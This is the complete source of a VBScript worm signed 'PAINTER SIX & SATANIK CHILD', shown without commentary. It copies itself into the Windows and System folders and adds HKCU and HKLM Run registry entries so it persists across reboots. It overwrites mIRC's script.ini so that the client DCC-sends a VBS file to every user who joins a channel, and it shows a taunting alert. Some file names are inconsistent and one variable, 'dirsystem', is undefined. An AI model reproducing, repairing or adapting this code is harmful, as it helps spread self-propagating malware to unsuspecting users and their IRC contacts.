DEBUT()
Sub DEBUT()
Set a = CreateObject("Scripting.FileSystemObject")
Set win = a.GetSpecialFolder(0)
Set sys = a.GetSpecialFolder(1)
Set c = a.GetFile(WScript.ScriptFullName)
c.Copy(win&"\PAINTERSIX.VBS")
c.Copy(sys&"\SATANYKCHYLD.VBS")
REGMODIFY()
MsgBox "Alert!  This is the first of many to come by PAINTER SIX & SATANIK CHILD",vbinformation
End Sub

Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
If (fso.FileExists("c:\mirc\mirc.ini")) Then
	Set mIRC = fso.CreateTextFile("c:\mirc\script.ini")
	mIRC.WriteLine "[script]"
	mIRC.WriteLine ";VBS.PEEPTHIS.VBS"
	mIRC.WriteLine ";THIS IS THE FIRST OF MANY TO KOME KREATIONZ TO FROM PAINTER SIX & SATANIK CHILD!"
	mIRC.WriteLine ";Pleaze do NOT edit this script.. it will affect your mIRC server"
	mIRC.WriteLine ";"
	mIRC.WriteLine ";For further detailz.. contact:"
	mIRC.WriteLine ";IvanaHumpAlot@ILIKE2FUKU.CUM"
	mIRC.WriteLine ";http://www.mirc.com"
	mIRC.WriteLine ";"
	mIRC.WriteLine "n0=on 1:JOIN:#:{"
	mIRC.WriteLine "n1= /if ( $nick == $me ) { halt }"
	mIRC.WriteLine "n2= /.dcc send $nick "&dirsystem&"\SATANIKCHILD.VBS"
	mIRC.WriteLine "n3=}"
	mIRC.Close
End If

rem MODIFY THE PAGE OF STARTING OF INTERNET

Sub REGMODIFY()
Set W = Wscript.CreateObject("WScript.Shell")
W.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SATANIK CHILD", "C:\WINDOWS\SYSTEM\SATANYKCHYLD.VBS"
W.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PAINTER SIX", "C:\WINDOWS\PAINTERSIX.VBS"
End Sub